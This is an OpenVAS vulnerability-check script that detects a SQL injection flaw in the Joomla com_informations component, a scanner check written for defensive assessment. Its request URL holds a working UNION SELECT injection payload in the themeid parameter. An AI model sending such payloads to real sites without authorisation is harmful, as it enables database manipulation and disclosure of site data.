###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_com_informations_sql_vuln.nasl 11323 2018-09-11 10:20:18Z ckuersteiner $
#
# Joomla com_informations Component SQL Injection Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806036");
  script_version("$Revision: 11323 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-11 12:20:18 +0200 (Tue, 11 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-09-02 17:55:52 +0530 (Wed, 02 Sep 2015)");
  script_tag(name:"qod_type", value:"remote_vul");

  script_name("Joomla com_informations Component SQL Injection Vulnerability");

  script_tag(name:"summary", value:"The host is installed with Joomla com_informations component and is prone to
sql injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and check whether it is able to execute
sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to an input sanitization error in 'com_informations' component.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject or manipulate
SQL queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Joomla com_informations component all versions.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37774");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!joomlaPort = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:joomlaPort))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/index.php?option=com_informations&view=sousthemes&themeid='+
            '999.9+union+select+111,222,version()%23';

if(http_vuln_check(port:joomlaPort, url:url, check_header:TRUE,
                   pattern:"ftp://...@([0-9.]+).*",
                   extra_check:make_list("Joomla", "file_get_contents")))
{
  report = report_vuln_url( port:joomlaPort, url:url );
  security_message(port:joomlaPort, data:report);
  exit(0);
}

exit(99);
